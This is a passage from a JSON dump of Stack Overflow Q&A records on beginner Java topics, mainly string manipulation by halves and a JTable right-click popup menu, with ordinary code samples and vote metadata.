205, 220, 357, 363, 415, 477, 477, 500, 592, 660, 689, 737, 800, 820, 834, 854, 888, 955]\n\ntest for set(int, E) method:\n[75, 205, 220, 357, 363, 415, 477, 477, 500, 592, 660, 689, 737, 800, 820, 834, 854, 888, 955, 999]\n</code></pre>\n"}],"owner":{"display_name":"rohan"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":221259,"favorite_count":0,"down_vote_count":2,"up_vote_count":171,"answer_count":21,"score":169,"last_activity_date":1642483902,"creation_date":1231243325,"question_id":416266,"body_markdown":"I&#39;m a beginner in Java.  Please suggest which collection(s) can/should be used for maintaining a sorted list in Java. I have tried `Map` and `Set`, but they weren&#39;t what I was looking for.\r\n","title":"Sorted collection in Java","body":"<p>I'm a beginner in Java.  Please suggest which collection(s) can/should be used for maintaining a sorted list in Java. I have tried <code>Map</code> and <code>Set</code>, but they weren't what I was looking for.</p>\n"},{"tags":["java"],"answers":[{"tags":[],"owner":{"account_id":23803283,"reputation":126,"user_id":17813175,"display_name":"Mohaideen Samsudeen"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642483208,"creation_date":1642483208,"answer_id":70750612,"question_id":70750473,"body_markdown":"Hope this code helps you.\r\n\r\n```\r\npublic class JavaMain {\r\n    public static void main(String[] args) {\r\n        String[] items = {&quot;milk&quot;, &quot;donut&quot;, &quot;cookies&quot;, &quot;cheese&quot;};\r\n\r\n        Arrays.stream(items).forEach(System.out::println);\r\n\r\n        List&lt;String&gt; divByTwo    = new ArrayList&lt;&gt;();\r\n        List&lt;String&gt; nonDivByTwo = new ArrayList&lt;&gt;();\r\n\r\n        for(String item : items){\r\n            if (item.length() % 2 == 0) {\r\n                divByTwo.add(reverseFirstAndCombineWithSecHalf(item));\r\n                //so far I only managed to figure out the divisible.\r\n                //Take first half of String and reverse it and combine with second half\r\n            } else {\r\n                //Swap first letter to the last letter of the string\r\n                nonDivByTwo.add(String.valueOf(swapFunction(item, 0, item.length()-1)));\r\n            }\r\n        }\r\n\r\n        System.out.println(&quot;Divisible by two: &quot; + divByTwo.stream().collect(Collectors.joining(&quot; &quot;)));\r\n        System.out.println(&quot;Not Divisible by two: &quot; + nonDivByTwo.stream().collect(Collectors.joining(&quot; &quot;)));\r\n    }\r\n\r\n    static char[] swapFunction(String item, int from, int to){\r\n        char ch[] = item.toCharArray();\r\n        char temp = ch[from];\r\n        ch[from] = ch[to];\r\n        ch[to] = temp;\r\n        return ch;\r\n    }\r\n\r\n    static String reverseFirstAndCombineWithSecHalf(String item){\r\n        String firstHalf  = StringUtils.reverse(StringUtils.substring(item, 0, item.length() / 2));\r\n        String secondHalf = StringUtils.substring(item, item.length() / 2, item.length());\r\n        return firstHalf.concat(secondHalf);\r\n    }\r\n}\r\n```\r\n\r\nOutput would be \r\n\r\n```\r\nmilk\r\ndonut\r\ncookies\r\ncheese\r\nDivisible by two: imlk ehcese\r\nNot Divisible by two: tonud sookiec\r\n\r\n```","title":"How to take first half of String and reverse it and combine it with second half. Otherwise Swap the first letter and last letter of String","body":"<p>Hope this code helps you.</p>\n<pre><code>public class JavaMain {\n    public static void main(String[] args) {\n        String[] items = {&quot;milk&quot;, &quot;donut&quot;, &quot;cookies&quot;, &quot;cheese&quot;};\n\n        Arrays.stream(items).forEach(System.out::println);\n\n        List&lt;String&gt; divByTwo    = new ArrayList&lt;&gt;();\n        List&lt;String&gt; nonDivByTwo = new ArrayList&lt;&gt;();\n\n        for(String item : items){\n            if (item.length() % 2 == 0) {\n                divByTwo.add(reverseFirstAndCombineWithSecHalf(item));\n                //so far I only managed to figure out the divisible.\n                //Take first half of String and reverse it and combine with second half\n            } else {\n                //Swap first letter to the last letter of the string\n                nonDivByTwo.add(String.valueOf(swapFunction(item, 0, item.length()-1)));\n            }\n        }\n\n        System.out.println(&quot;Divisible by two: &quot; + divByTwo.stream().collect(Collectors.joining(&quot; &quot;)));\n        System.out.println(&quot;Not Divisible by two: &quot; + nonDivByTwo.stream().collect(Collectors.joining(&quot; &quot;)));\n    }\n\n    static char[] swapFunction(String item, int from, int to){\n        char ch[] = item.toCharArray();\n        char temp = ch[from];\n        ch[from] = ch[to];\n        ch[to] = temp;\n        return ch;\n    }\n\n    static String reverseFirstAndCombineWithSecHalf(String item){\n        String firstHalf  = StringUtils.reverse(StringUtils.substring(item, 0, item.length() / 2));\n        String secondHalf = StringUtils.substring(item, item.length() / 2, item.length());\n        return firstHalf.concat(secondHalf);\n    }\n}\n</code></pre>\n<p>Output would be</p>\n<pre><code>milk\ndonut\ncookies\ncheese\nDivisible by two: imlk ehcese\nNot Divisible by two: tonud sookiec\n\n</code></pre>\n"},{"tags":[],"owner":{"display_name":"user10260739"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642483893,"creation_date":1642483893,"answer_id":70750703,"question_id":70750473,"body_markdown":"Using String and StringBuilder class methods you can do it as below:-\r\n\r\n    import java.util.Arrays;\r\n    \r\n    public class Test {\r\n    \r\n    \tpublic static void main(String[] args) {\r\n    \t\tString[] items = { &quot;milk&quot;, &quot;donut&quot;, &quot;cookies&quot;, &quot;cheese&quot; };\r\n    \t\tSystem.out.println(Arrays.toString(items));\r\n    \r\n    \t\tfor (int i = 0; i &lt; items.length; i++) {\r\n    \t\t\tString item = items[i];\r\n    \t\t\tif (item.length() % 2 == 0) {\r\n    \t\t\t\t// Take first half of String and reverse it and combine with second half\r\n    \t\t\t\tStringBuilder firstHalf = new StringBuilder(item.substring(0, item.length() / 2));\r\n    \t\t\t\tfirstHalf = firstHalf.reverse();\r\n    \t\t\t\tStringBuilder secondHalf = new StringBuilder(item.substring(item.length() / 2));\r\n    \t\t\t\titems[i] = firstHalf.append(secondHalf).toString();\r\n    \t\t\t} else {\r\n    \t\t\t\t// Swap first letter to the last letter of the string\r\n    \t\t\t\titems[i] = Character.toString(item.charAt(item.length() - 1)) \r\n    \t\t\t\t\t\t+ item.substring(1, item.length()-1)\r\n    \t\t\t\t\t\t+ Character.toString(item.charAt(0));\r\n    \t\t\t}\r\n    \t\t}\r\n    \t\tSystem.out.println(Arrays.toString(items));\r\n    \t}\r\n    \r\n    }\r\n\r\nOutput:-\r\n\r\n    [milk, donut, cookies, cheese]\r\n    [imlk, tonud, sookiec, ehcese]\r\n\r\n","title":"How to take first half of String and reverse it and combine it with second half. Otherwise Swap the first letter and last letter of String","body":"<p>Using String and StringBuilder class methods you can do it as below:-</p>\n<pre><code>import java.util.Arrays;\n\npublic class Test {\n\n    public static void main(String[] args) {\n        String[] items = { &quot;milk&quot;, &quot;donut&quot;, &quot;cookies&quot;, &quot;cheese&quot; };\n        System.out.println(Arrays.toString(items));\n\n        for (int i = 0; i &lt; items.length; i++) {\n            String item = items[i];\n            if (item.length() % 2 == 0) {\n                // Take first half of String and reverse it and combine with second half\n                StringBuilder firstHalf = new StringBuilder(item.substring(0, item.length() / 2));\n                firstHalf = firstHalf.reverse();\n                StringBuilder secondHalf = new StringBuilder(item.substring(item.length() / 2));\n                items[i] = firstHalf.append(secondHalf).toString();\n            } else {\n                // Swap first letter to the last letter of the string\n                items[i] = Character.toString(item.charAt(item.length() - 1)) \n                        + item.substring(1, item.length()-1)\n                        + Character.toString(item.charAt(0));\n            }\n        }\n        System.out.println(Arrays.toString(items));\n    }\n\n}\n</code></pre>\n<p>Output:-</p>\n<pre><code>[milk, donut, cookies, cheese]\n[imlk, tonud, sookiec, ehcese]\n</code></pre>\n"}],"owner":{"account_id":23037663,"reputation":1,"user_id":17156215,"display_name":"mykey27"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1105,"favorite_count":0,"down_vote_count":4,"up_vote_count":0,"closed_date":1642500465,"answer_count":2,"score":-4,"last_activity_date":1642483893,"creation_date":1642481912,"question_id":70750473,"body_markdown":"If length is divisible by two, take first half of String and reverse it and combine with second half.\r\nOtherwise Swap first letter to the last letter of the string.\r\n\r\n   \r\n\r\n     String[] items = {&quot;milk&quot;, &quot;donut&quot;, &quot;cookies&quot;, &quot;cheese&quot;};\r\n        System.out.println(&quot;Original word:\\n1.milk\\n2.donut\\n3.cookies\\n4.cheese&quot;)\r\n    \r\n        if (items[0].length() % 2 == 0) //so far I only managed to figure out the divisible.\r\n          {\r\n            //Take first half of String and reverse it and combine with second half\r\n          }\r\n          else\r\n          {\r\n            //Swap first letter to the last letter of the string\r\n          }\r\n    \r\n        /* Output\r\n        Original word:\r\n        1.milk\r\n        2.donut\r\n        3.cookies\r\n        4.cheese\r\n        Divisible by two: imlk ehcese\r\n        Not Divisible by two: tonud sookiec*/ ","title":"How to take first half of String and reverse it and combine it with second half. Otherwise Swap the first letter and last letter of String","body":"<p>If length is divisible by two, take first half of String and reverse it and combine with second half.\nOtherwise Swap first letter to the last letter of the string.</p>\n<pre><code> String[] items = {&quot;milk&quot;, &quot;donut&quot;, &quot;cookies&quot;, &quot;cheese&quot;};\n    System.out.println(&quot;Original word:\\n1.milk\\n2.donut\\n3.cookies\\n4.cheese&quot;)\n\n    if (items[0].length() % 2 == 0) //so far I only managed to figure out the divisible.\n      {\n        //Take first half of String and reverse it and combine with second half\n      }\n      else\n      {\n        //Swap first letter to the last letter of the string\n      }\n\n    /* Output\n    Original word:\n    1.milk\n    2.donut\n    3.cookies\n    4.cheese\n    Divisible by two: imlk ehcese\n    Not Divisible by two: tonud sookiec*/ \n</code></pre>\n"},{"tags":["java","sql","swing","jtable","awt"],"comments":[{"owner":{"account_id":969721,"reputation":344518,"user_id":992484,"accept_rate":60,"display_name":"MadProgrammer"},"score":0,"creation_date":1369430124,"post_id":16743427,"comment_id":24115987,"body_markdown":"Take a look at [JComponent#setComponentPopup](http://docs.oracle.com/javase/7/docs/api/javax/swing/JComponent.html#setComponentPopupMenu(javax.swing.JPopupMenu))","body":"Take a look at <a href=\"http://docs.oracle.com/javase/7/docs/api/javax/swing/JComponent.html#setComponentPopupMenu(javax.swing.JPopupMenu)\" rel=\"nofollow noreferrer\">JComponent#setComponentPopup</a>"},{"owner":{"account_id":178970,"reputation":5078,"user_id":411282,"accept_rate":67,"display_name":"Joshua Goldberg"},"score":0,"creation_date":1423263203,"post_id":16743427,"comment_id":45092544,"body_markdown":"This solution (similar question that isn&#39;t linked here yet) worked best for me: http://stackoverflow.com/a/17316876/411282","body":"This solution (similar question that isn&#39;t linked here yet) worked best for me: <a href=\"http://stackoverflow.com/a/17316876/411282\">stackoverflow.com/a/17316876/411282</a>"}],"answers":[{"tags":[],"owner":{"account_id":890308,"reputation":47359,"user_id":928711,"accept_rate":60,"display_name":"Guillaume Polet"},"down_vote_count":1,"up_vote_count":49,"is_accepted":false,"score":48,"last_activity_date":1440150429,"creation_date":1369433586,"answer_id":16744349,"question_id":16743427,"body_markdown":"Here is an example on how to do that. The easiest way to achieve this, is to set a `JPopupMenu` on the JTable directly.\r\n\r\n    import java.awt.BorderLayout;\r\n    import java.awt.event.ActionEvent;\r\n    import java.awt.event.ActionListener;\r\n    import java.util.Arrays;\r\n    import java.util.Vector;\r\n    \r\n    import javax.swing.JFrame;\r\n    import javax.swing.JMenuItem;\r\n    import javax.swing.JOptionPane;\r\n    import javax.swing.JPopupMenu;\r\n    import javax.swing.JScrollPane;\r\n    import javax.swing.JTable;\r\n    import javax.swing.SwingUtilities;\r\n    \r\n    public class TestTableRightClick {\r\n    \r\n    \tprotected void initUI() {\r\n    \t\tfinal JFrame frame = new JFrame(TestTableRightClick.class.getSimpleName());\r\n    \t\tVector&lt;String&gt; columns = new Vector&lt;String&gt;(Arrays.asList(&quot;Name&quot;, &quot;Age&quot;));\r\n    \t\tVector&lt;Vector&lt;String&gt;&gt; data = new Vector&lt;Vector&lt;String&gt;&gt;();\r\n    \t\tfor (int i = 0; i &lt; 50; i++) {\r\n    \t\t\tVector&lt;String&gt; row = new Vector&lt;String&gt;();\r\n    \t\t\tfor (int j = 0; j &lt; columns.size(); j++) {\r\n    \t\t\t\trow.add(&quot;Cell &quot; + (i + 1) + &quot;,&quot; + (j + 1));\r\n    \t\t\t}\r\n    \t\t\tdata.add(row);\r\n    \t\t}\r\n    \t\tfinal JTable table = new JTable(data, columns);\r\n    \t\tfinal JPopupMenu popupMenu = new JPopupMenu();\r\n    \t\tJMenuItem deleteItem = new JMenuItem(&quot;Delete&quot;);\r\n    \t\tdeleteItem.addActionListener(new ActionListener() {\r\n    \r\n    \t\t\t@Override\r\n    \t\t\tpublic void actionPerformed(ActionEvent e) {\r\n    \t\t\t\tJOptionPane.showMessageDialog(frame, &quot;Right-click performed on table and choose DELETE&quot;);\r\n    \t\t\t}\r\n    \t\t});\r\n    \t\tpopupMenu.add(deleteItem);\r\n    \t\ttable.setComponentPopupMenu(popupMenu);\r\n    \t\tframe.add(new JScrollPane(table), BorderLayout.CENTER);\r\n    \t\tframe.pack();\r\n    \t\tframe.setVisible(true);\r\n    \t}\r\n    \r\n    \tpublic static void main(String[] args) {\r\n    \t\tSwingUtilities.invokeLater(new Runnable() {\r\n    \r\n    \t\t\t@Override\r\n    \t\t\tpublic void run() {\r\n    \t\t\t\tnew TestTableRightClick().initUI();\r\n    \t\t\t}\r\n    \t\t});\r\n    \t}\r\n    }\r\n\r\nIn case you want to automatically select the row where the right-click was made, add the following snippet:\r\n\r\n    popupMenu.addPopupMenuListener(new PopupMenuListener() {\r\n    \r\n    \t\t\t@Override\r\n    \t\t\tpublic void popupMenuWillBecomeVisible(PopupMenuEvent e) {\r\n    \t\t\t\tSwingUtilities.invokeLater(new Runnable() {\r\n    \t\t\t\t\t@Override\r\n    \t\t\t\t\tpublic void run() {\r\n    \t\t\t\t\t\tint rowAtPoint = table.rowAtPoint(SwingUtilities.convertPoint(popupMenu, new Point(0, 0), table));\r\n    \t\t\t\t\t\tif (rowAtPoint &gt; -1) {\r\n    \t\t\t\t\t\t\ttable.setRowSelectionInterval(rowAtPoint, rowAtPoint);\r\n    \t\t\t\t\t\t}\r\n    \t\t\t\t\t}\r\n    \t\t\t\t});\r\n    \t\t\t}\r\n    \r\n    \t\t\t@Override\r\n    \t\t\tpublic void popupMenuWillBecomeInvisible(PopupMenuEvent e) {\r\n    \t\t\t\t// TODO Auto-generated method stub\r\n    \r\n    \t\t\t}\r\n    \r\n    \t\t\t@Override\r\n    \t\t\tpublic void popupMenuCanceled(PopupMenuEvent e) {\r\n    \t\t\t\t// TODO Auto-generated method stub\r\n    \r\n    \t\t\t}\r\n    \t\t});","title":"jTable right-click popup menu","body":"<p>Here is an example on how to do that. The easiest way to achieve this, is to set a <code>JPopupMenu</code> on the JTable directly.</p>\n\n<pre><code>import java.awt.BorderLayout;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.util.Arrays;\nimport java.util.Vector;\n\nimport javax.swing.JFrame;\nimport javax.swing.JMenuItem;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPopupMenu;\nimport javax.swing.JScrollPane;\nimport javax.swing.JTable;\nimport javax.swing.SwingUtilities;\n\npublic class TestTableRightClick {\n\n    protected void initUI() {\n        final JFrame frame = new JFrame(TestTableRightClick.class.getSimpleName());\n        Vector&lt;String&gt; columns = new Vector&lt;String&gt;(Arrays.asList(\"Name\", \"Age\"));\n        Vector&lt;Vector&lt;String&gt;&gt; data = new Vector&lt;Vector&lt;String&gt;&gt;();\n        for (int i = 0; i &lt; 50; i++) {\n            Vector&lt;String&gt; row = new Vector&lt;String&gt;();\n            for (int j = 0; j &lt; columns.size(); j++) {\n                row.add(\"Cell \" + (i + 1) + \",\" + (j + 1));\n            }\n            data.add(row);\n        }\n        final JTable table = new JTable(data, columns);\n        final JPopupMenu popupMenu = new JPopupMenu();\n        JMenuItem deleteItem = new JMenuItem(\"Delete\");\n        deleteItem.addActionListener(new ActionListener() {\n\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                JOptionPane.showMessageDialog(frame, \"Right-click performed on table and choose DELETE\");\n            }\n        });\n        popupMenu.add(deleteItem);\n        table.setComponentPopupMenu(popupMenu);\n        frame.add(new JScrollPane(table), BorderLayout.CENTER);\n        frame.pack();\n        frame.setVisible(true);\n    }\n\n    public static void main(String[] args) {\n        SwingUtilities.invokeLater(new Runnable() {\n\n            @Override\n            public void run() {\n                new TestTableRightClick().initUI();\n            }\n        });\n    }\n}\n</code></pre>\n\n<p>In case you want to automatically select the row where the right-click was made, add the following snippet:</p>\n\n<pre><code>popupMenu.addPopupMenuListener(new PopupMenuListener() {\n\n            @Override\n            public void popupMenuWillBecomeVisible(PopupMenuEvent e) {\n                SwingUtilities.invokeLater(new Runnable() {\n                    @Override\n                    public void run() {\n                        int rowAtPoint = table.rowAtPoint(SwingUtilities.convertPoint(popupMenu, new Point(0, 0), table));\n                        if (rowAtPoint &gt; -1) {\n                            table.setRowSelectionInterval(rowAtPoint, rowAtPoint);\n                        }\n                    }\n                });\n            }\n\n            @Override\n            public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {\n                // TODO Auto-generated method stub\n\n            }\n\n            @Override\n            public void popupMenuCanceled(PopupMenuEvent e) {\n                // TODO Auto-generated method stub\n\n            }\n        });\n</code></pre>\n"},{"tags":[],"owner":{"account_id":44852,"reputation":322224,"user_id":131872,"accept_rate":100,"display_name":"camickr"},"down_vote_count":0,"up_vote_count":18,"is_accepted":false,"score":18,"last_activity_date":1369435498,"creation_date":1369435498,"answer_id":16744590,"question_id":16743427,"body_markdown":"A problem with a JTable is that the right click does not change the row selection. So you if have an Action that works on a specific row you need to left click the row first before right clicking to have the popup menu displayed.\r\n\r\nIf you want the row to be selected where your right click then you can use code like the following:\r\n\r\n    import java.awt.*;\r\n    import java.awt.event.*;\r\n    import javax.swing.*;\r\n    \r\n    public class TableRightClick extends JFrame implements ActionListener\r\n    {\r\n    \tJPopupMenu popup;\r\n    \r\n    \tpublic TableRightClick()\r\n    \t{\r\n    \t\tpopup = new JPopupMenu();\r\n    \t\tpopup.add( new JMenuItem(&quot;Do Something1&quot;) );\r\n    \t\tpopup.add( new JMenuItem(&quot;Do Something2&quot;) );\r\n    \t\tpopup.add( new JMenuItem(&quot;Do Something3&quot;) );\r\n    \t\tJMenuItem menuItem = new JMenuItem(&quot;ActionPerformed&quot;);\r\n    \t\tmenuItem.addActionListener( this );\r\n    \t\tpopup.add( menuItem );\r\n    \r\n    \t\tJTable table = new JTable(50, 5);\r\n    \t\ttable.addMouseListener( new MouseAdapter()\r\n    \t\t{\r\n    \t\t\tpublic void mousePressed(MouseEvent e)\r\n    \t\t\t{\r\n    \t\t\t\tSystem.out.println(&quot;pressed&quot;);\r\n    \t\t\t}\r\n    \r\n    \t\t\tpublic void mouseReleased(MouseEvent e)\r\n    \t\t\t{\r\n    \t\t\t\tif (e.isPopupTrigger())\r\n    \t\t\t\t{\r\n    \t\t\t\t\tJTable source = (JTable)e.getSource();\r\n    \t\t\t\t\tint row = source.rowAtPoint( e.getPoint() );\r\n    \t\t\t\t\tint column = source.columnAtPoint( e.getPoint() );\r\n    \r\n    \t\t\t\t\tif (! source.isRowSelected(row))\r\n    \t\t\t\t\t\tsource.changeSelection(row, column, false, false);\r\n    \r\n    \t\t\t\t\tpopup.show(e.getComponent(), e.getX(), e.getY());\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \t\t});\r\n    \t\ttable.setPreferredScrollableViewportSize(table.getPreferredSize());\r\n    \t\tgetContentPane().add( new JScrollPane(table) );\r\n    \t}\r\n    \r\n    \tpublic void actionPerformed(ActionEvent e)\r\n    \t{\r\n    \t\tComponent c = (Component)e.getSource();\r\n    \t\tJPopupMenu popup = (JPopupMenu)c.getParent();\r\n    \t\tJTable table = (JTable)popup.getInvoker();\r\n    \t\tSystem.out.println(table.getSelectedRow() + &quot; : &quot; + table.getSelectedColumn());\r\n    \t}\r\n    \r\n    \tpublic static void main(String[] args)\r\n    \t{\r\n    \t\tTableRightClick frame = new TableRightClick();\r\n    \t\tframe.setDefaultCloseOperation( EXIT_ON_CLOSE );\r\n    \t\tframe.pack();\r\n    \t\tframe.setLocationRelativeTo( null );\r\n    \t\tframe.setVisible( true );\r\n    \t}\r\n    }\r\n\r\n","title":"jTable right-click popup menu","body":"<p>A problem with a JTable is that the right click does not change the row selection. So you if have an Action that works on a specific row you need to left click the row first before right clicking to have the popup menu displayed.</p>\n\n<p>If you want the row to be selected where your right click then you can use code like the following:</p>\n\n<pre><code>import java.awt.*;\nimport java.awt.event.*;\nimport javax.swing.*;\n\npublic class TableRightClick extends JFrame implements ActionListener\n{\n    JPopupMenu popup;\n\n    public TableRightClick()\n    {\n        popup = new JPopupMenu();\n        popup.add( new JMenuItem(\"Do Something1\") );\n        popup.add( new JMenuItem(\"Do Something2\") );\n        popup.add( new JMenuItem(\"Do Something3\") );\n        JMenuItem menuItem = new JMenuItem(\"ActionPerformed\");\n        menuItem.addActionListener( this );\n        popup.add( menuItem );\n\n        JTable table = new JTable(50, 5);\n        table.addMouseListener( new MouseAdapter()\n        {\n            public void mousePressed(MouseEvent e)\n            {\n                System.out.println(\"pressed\");\n            }\n\n            public void mouseReleased(MouseEvent e)\n            {\n                if (e.isPopupTrigger())\n                {\n                    JTable source = (JTable)e.getSource();\n                    int row = source.rowAtPoint( e.getPoint() );\n                    int column = source.columnAtPoint( e.getPoint() );\n\n                    if (! source.isRowSelected(row))\n                        source.changeSelection(row, column, false, false);\n\n                    popup.show(e.getComponent(), e.getX(), e.getY());\n                }\n            }\n        });\n        table.setPreferredScrollableViewportSize(table.getPreferredSize());\n        getContentPane().add( new JScrollPane(table) );\n    }\n\n    public void actionPerformed(ActionEvent e)\n    {\n        Component c = (Component)e.getSource();\n        JPopupMenu popup = (JPopupMenu)c.getParent();\n        JTable table = (JTable)popup.getInvoker();\n        System.out.println(table.getSelectedRow() + \" : \" + table.getSelectedColumn());\n    }\n\n    public static void main(String[] args)\n    {\n        TableRightClick frame = new TableRightClick();\n        frame.setDefaultCloseOperation( EXIT_ON_CLOSE );\n        frame.pack();\n        frame.setLocationRelativeTo( null );\n        frame.setVisible( true );\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4221128,"reputation":728,"user_id":3455897,"accept_rate":46,"display_name":"Phil"},"down_vote_count":3,"up_vote_count":1,"is_accepted":false,"score":-2,"last_activity_date":1612035344,"creation_date":1474961494,"answer_id":39718697,"question_id":16743427,"body_markdown":"Another issue is that context menus are dynamic, your solution does not deal with changing the menu depending on the clicked row\r\n\r\n\r\n    popupMenu.addPopupMenuListener(new PopupMenuListener() \r\n    {\r\n       @Override\r\n       public void popupMenuWillBecomeVisible(PopupMenuEvent e) \r\n       { \r\n           int rowAtPoint = table.rowAtPoint(SwingUtilities.convertPoint(popupMenu, new Point(0, 0), table));\r\n           generateTablePopupMenu(rowAtPoint); // here\r\n           SwingUtilities.invokeLater(new Runnable() \r\n               ...\r\n\r\n    ","title":"jTable right-click popup menu","body":"<p>Another issue is that context menus are dynamic, your solution does not deal with changing the menu depending on the clicked row</p>\n<pre><code>popupMenu.addPopupMenuListener(new PopupMenuListener() \n{\n   @Override\n   public void popupMenuWillBecomeVisible(PopupMenuEvent e) \n   { \n       int rowAtPoint = table.rowAtPoint(SwingUtilities.convertPoint(popupMenu, new Point(0, 0), table));\n       generateTablePopupMenu(rowAtPoint); // here\n       SwingUtilities.invokeLater(new Runnable() \n           ...\n</code></pre>\n"},{"tags":[],"owner":{"account_id":20591098,"reputation":1,"user_id":15114721,"display_name":"Pedro-McM"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642483559,"creation_date":1642483559,"answer_id":70750657,"question_id":16743427,"body_markdown":"Unfortunately, none of these solutions worked for me on both Macs and PC&#39;s. Not sure why.  But this worked on both:\r\n\r\n    @Override\r\n\tpublic void popupMenuWillBecomeInvisible(PopupMenuEvent e) {\r\n        int row = table.rowAtPoint(SwingUtilities.convertPoint(popup, 0, 0, table));\r\n\r\n        if (row &gt; -1)\r\n\t        table.setRowSelectionInterval(row, row);\r\n\t}\r\nThe main problem with my solution is that it doesn&#39;t show that the row is selected until after the user chooses one of the menu options.","title":"jTable right-click popup menu","body":"<p>Unfortunately, none of these solutions worked for me on both Macs and PC's. Not sure why.  But this worked on both:</p>\n<pre><code>@Override\npublic void popupMenuWillBecomeInvisible(PopupMenuEvent e) {\n    int row = table.rowAtPoint(SwingUtilities.convertPoint(popup, 0, 0, table));\n\n    if (row &gt; -1)\n        table.setRowSelectionInterval(row, row);\n}\n</code></pre>\n<p>The main problem with my solution is that it doesn't show that the row is selected until after the user chooses one of the menu options.</p>\n"}],"owner":{"account_id":2637211,"reputation":293,"user_id":2281591,"display_name":"Garrett Innovations"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":50694,"favorite_count":0,"down_vote_count":1,"up_vote_count":27,"answer_count":4,"score":26,"last_activity_date":1642483559,"creation_date":1369428466,"question_id":16743427,"body_markdown":"I have a SQL database and I am working on a program that will allow me to add/delete/modify records. I already managed to add records I am working on editing/deleting them.\r\n\r\nI want to display the existing records in a table so I am using jTable. I found some code online and modified it to pull the records and display them in a jtable but i dont know how to code the rightclick and display a popup menu.\r\n\r\nIn that popup menu I want to display options such as delete record and modify record.\r\n\r\nThis is the code I am using the make the jTable and display the data:\r\n\r\n     private void menuDeleteAuthorActionPerformed(java.awt.event.ActionEvent evt) {                                                 \r\n        TableFromDatabase deleteAuthor = new TableFromDatabase();\r\n        deleteAuthor.pack();\r\n        deleteAuthor.setVisible(true);\r\n        \r\n        Vector columnNames = new Vector();\r\n        Vector data = new Vector();\r\n\r\n        try\r\n        {\r\n\r\n            Connection connection = DriverManager.getConnection( url, user, password );\r\n\r\n            //  Read data from a table\r\n\r\n            String sql = &quot;SELECT * FROM Authors&quot;;\r\n            Statement stmt = connection.createStatement();\r\n            ResultSet rs = stmt.executeQuery( sql );\r\n            ResultSetMetaData md = rs.getMetaData();\r\n            int columns = md.getColumnCount();\r\n\r\n            //  Get column names\r\n\r\n            for (int i = 1; i &lt;= columns; i++)\r\n            {\r\n                columnNames.addElement( md.getColumnName(i) );\r\n            }\r\n\r\n            //  Get row data\r\n\r\n            while (rs.next())\r\n            {\r\n                Vector row = new Vector(columns);\r\n\r\n                for (int i = 1; i &lt;= columns; i++)\r\n                {\r\n                    row.addElement( rs.getObject(i) );\r\n                }\r\n\r\n                data.addElement( row );\r\n            }\r\n\r\n            rs.close();\r\n            stmt.close();\r\n            connection.close();\r\n        }\r\n        catch(Exception e)\r\n        {\r\n            System.out.println( e );\r\n        }\r\n\r\n        //  Create table with database data\r\n\r\n        JTable table = new JTable(data, columnNames)\r\n        {\r\n            public Class getColumnClass(int column)\r\n            {\r\n                for (int row = 0; row &lt; getRowCount(); row++)\r\n                {\r\n                    Object o = getValueAt(row, column);\r\n\r\n                    if (o != null)\r\n                    {\r\n                        return o.getClass();\r\n                    }\r\n                }\r\n\r\n                return Object.class;\r\n            }\r\n        };\r\n\r\n        JScrollPane scrollPane = new JScrollPane( table );\r\n        getContentPane().add( scrollPane );\r\n\r\n        JPanel buttonPanel = new JPanel();\r\n        getContentPane().add( buttonPanel, BorderLayout.SOUTH );\r\n    }\r\n\r\nI am new to Java so please be kind in your responses. Thank you all in advance for any assistance!","title":"jTable right-click popup menu","body":"<p>I have a SQL database and I am working on a program that will allow me to add/delete/modify records. I already managed to add records I am working on editing/deleting them.</p>\n\n<p>I want to display the existing records in a table so I am using jTable. I found some code online and modified it to pull the records and display them in a jtable but i dont know how to code the rightclick and display a popup menu.</p>\n\n<p>In that popup menu I want to display options such as delete record and modify record.</p>\n\n<p>This is the code I am using the make the jTable and display the data:</p>\n\n<pre><code> private void menuDeleteAuthorActionPerformed(java.awt.event.ActionEvent evt) {                                                 \n    TableFromDatabase deleteAuthor = new TableFromDatabase();\n    deleteAuthor.pack();\n    deleteAuthor.setVisible(true);\n\n    Vector columnNames = new Vector();\n    Vector data = new Vector();\n\n    try\n    {\n\n        Connection connection = DriverManager.getConnection( url, user, password );\n\n        //  Read data from a table\n\n        String sql = \"SELECT * FROM Authors\";\n        Statement stmt = connection.createStatement();\n        ResultSet rs = stmt.executeQuery( sql );\n        ResultSetMetaData md = rs.getMetaData();\n        int columns = md.getColumnCount();\n\n        //  Get column names\n\n        for (int i = 1; i &lt;= columns; i++)\n        {\n            columnNames.addElement( md.getColumnName(i) );\n        }\n\n        //  Get row data\n\n        while (rs.next())\n        {\n            Vector row = new Vector(columns);\n\n            for (int i = 1; i &lt;= columns; i++)\n            {\n                row.addElement( rs.getObject(i) );\n            }\n\n            data.addElement( row );\n        }\n\n        rs.close();\n        stmt.close();\n        connection.close();\n    }\n    catch(Exception e)\n    {\n        System.out.println( e );\n    }\n\n    //  Create table with database data\n\n    JTable table = new JTable(data, columnNames)\n    {\n        public Class getColumnClass(int column)\n        {\n            for (int row = 0; row &lt; getRowCount(); row++)\n            {\n                Object o = getValueAt(row, column);\n\n                if (o != null)\n                {\n                    return o.getClass();\n                }\n            }\n\n            return Object.class;\n        }\n    };\n\n    JScrollPane scrollPane = new JScrollPane( table );\n    getContentPane().add( scrollPane );\n\n    JPanel buttonPanel = new JPanel();\n    getContentPane().add( buttonPanel, BorderLayout.SOUTH );\n}\n</code></pre>\n\n<p>I am new to Java so please be kind in your responses. Thank you all in advance for any assistance!</p>\n"},{"tags":["java","loops","while-loop"],"comments":[{"owner":{"account_id":29346,"reputation":4188,"user_id":79230,"accept_rate":88,"display_name":"Averroes"},"score":1,"creation_date":1395248507,"post_id":22512830,"comment_id":34254178,"body_markdown":"old video games programming 101!","body":"old video games programming 